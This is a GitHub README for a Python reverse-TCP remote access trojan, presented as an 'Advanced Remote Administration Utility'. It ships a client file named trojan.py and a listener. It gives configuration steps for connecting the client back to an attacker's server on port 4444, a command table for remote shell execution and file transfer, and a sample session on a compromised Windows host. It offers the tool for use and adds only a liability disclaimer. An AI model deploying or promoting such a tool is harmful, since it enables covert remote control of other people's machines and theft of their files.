# Advanced Remote Administration Utility

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.10+-blue?style=for-the-badge&logo=python" />
  <img src="https://img.shields.io/badge/Platform-Cross--Platform-black?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Architecture-Reverse_TCP-darkgreen?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Status-Active-success?style=for-the-badge" />
</p>

<p align="center">
Minimal reverse TCP administration framework built with Python.
</p>

---

## Features

* Reverse TCP communication
* Interactive remote shell
* Remote command execution
* File upload functionality
* File download functionality
* Directory navigation
* Automatic reconnection
* Multi-client handling
* Cross-platform compatibility
* Lightweight architecture

---

## Repository Structure

```bash id="h9x4qt"
.
├── server.py
├── trojan.py
├── README.md
├── LICENSE
└── .gitignore
```

---

## Requirements

* Python 3.10+
* Network connectivity
* Socket support

---

# Installation

```bash id="v2n7yc"
git clone https://github.com/yourusername/advanced-rat.git
cd advanced-rat
```

---

# Listener Configuration

Edit the listener configuration inside `server.py`.

```python id="p5k8wr"
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444
```

Start the listener:

```bash id="q3m1zx"
python server.py
```

---

# Client Configuration

Edit the remote host configuration inside `trojan.py`.

```python id="a8t6vn"
SERVER_HOST = "YOUR_SERVER_IP"
SERVER_PORT = 4444
```

Execute the client:

```bash id="d7r2pk"
python trojan.py
```

---

# Available Commands

| Command                     | Description                |
| --------------------------- | -------------------------- |
| `help`                      | Display available commands |
| `cd <directory>`            | Change remote directory    |
| `upload <local> <remote>`   | Upload file                |
| `download <remote> <local>` | Download file              |
| `exit`                      | Terminate session          |

Any additional command entered through the console executes directly on the connected system.

---

# Example Session

```bash id="u6w9qx"
[*] Listening on 0.0.0.0:4444
[+] Accepted connection from 192.168.1.5
[+] Interactive session established

192.168.1.5# whoami
desktop-user

192.168.1.5# pwd
C:\Users\desktop-user
```

---

# Design Goals

* Minimal dependency footprint
* Lightweight execution
* Fast deployment
* Portable architecture
* Persistent socket communication
* Simple command-line workflow

---

# Disclaimer

You are responsible for your own actions.

This project is provided as-is without warranty of any kind. The author assumes no liability for misuse, damage, data loss, or legal consequences resulting from the use of this software.
